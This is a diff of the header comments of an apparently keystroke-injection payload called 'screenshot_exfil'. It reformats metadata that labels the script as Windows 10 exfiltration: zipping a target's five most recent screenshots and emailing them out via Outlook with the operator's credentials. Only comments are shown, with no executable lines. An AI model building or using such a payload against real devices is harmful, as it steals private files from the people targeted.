@@ -1,6 +1,10 @@
-REM ~~~~ Payload written by thejcksn (github.com/the-jcksn)
-REM ~~~~ Exfiltrates the 5 most recent screenshots (or folders within screenshots) on the target device. 
-REM ~~~~ Creates zip folder of screenshots and sends them via outlook email.
+REM Title: screenshot_exfil
+REM Author: the-jcksn
+REM Description: Creates zip folder of 5 most recent screenshots and sends them via outlook email.
+REM Target: Windows 10
+REM Version: 1.0
+REM Category: Exfiltration
+
 REM ~~~~ You must change the USER_EMAIL and USER_PASSWORD to your outlook credentials.
 REM ~~~~ Can exfil more than 5, but kept to 5 to keep file sizes low.
 REM ~~~~ Can exfil from directory other than screenshots by changing path on lines 14, 53, and 57.
